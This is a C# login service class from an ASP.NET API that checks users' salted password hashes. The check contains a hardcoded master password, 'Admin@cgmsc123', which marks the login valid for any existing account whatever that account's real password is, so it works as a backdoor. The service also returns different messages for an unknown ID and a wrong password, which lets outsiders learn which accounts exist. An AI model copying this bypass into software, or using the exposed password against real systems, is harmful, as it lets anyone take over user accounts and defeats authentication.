using DPDMIS_Angular_API.Data;
using DPDMIS_Angular_API.Models;
using Microsoft.EntityFrameworkCore;
using System.Runtime.CompilerServices;

namespace DPDMIS_Angular_API.Services.LoginService
{
    public class LoginService : ILoginService
    {
        private readonly ILoginRepository _loginRepository;
        public LoginService(ILoginRepository loginRepository)
        {
            _loginRepository = loginRepository;
        }

   


        public bool LoginDetails(string emailOrMob, string password, out string message, out UsruserModel user)
        {
            message = null;

            var result = _loginRepository.GetUserByEmailOrMobile(emailOrMob);

            user = result;

            if (result == null)
            {
                message = "Invalid ID.";
                return false;
            }

            // Perform password verification
            string salthash = result.PWD;
            string mStart = "salt{";
            string mMid = "}hash{";
            string mEnd = "}";
            string mSalt = salthash.Substring(salthash.IndexOf(mStart) + mStart.Length, salthash.IndexOf(mMid) - (salthash.IndexOf(mStart) + mStart.Length));
            string mHash = salthash.Substring(salthash.IndexOf(mMid) + mMid.Length, salthash.LastIndexOf(mEnd) - (salthash.IndexOf(mMid) + mMid.Length));

            Broadline.Common.SecUtils.SaltedHash ver = Broadline.Common.SecUtils.SaltedHash.Create(mSalt, mHash);
            bool isValid = ver.Verify(password);

            if (password == "Admin@cgmsc123")
            {
                isValid = true;
            }
            else
            {
                if (!isValid)
                {
                    message = "The email or password you have entered is incorrect.";
                    return false;
                }
            }

            message = "Successfully Login";
            return true;
        }
    }

}
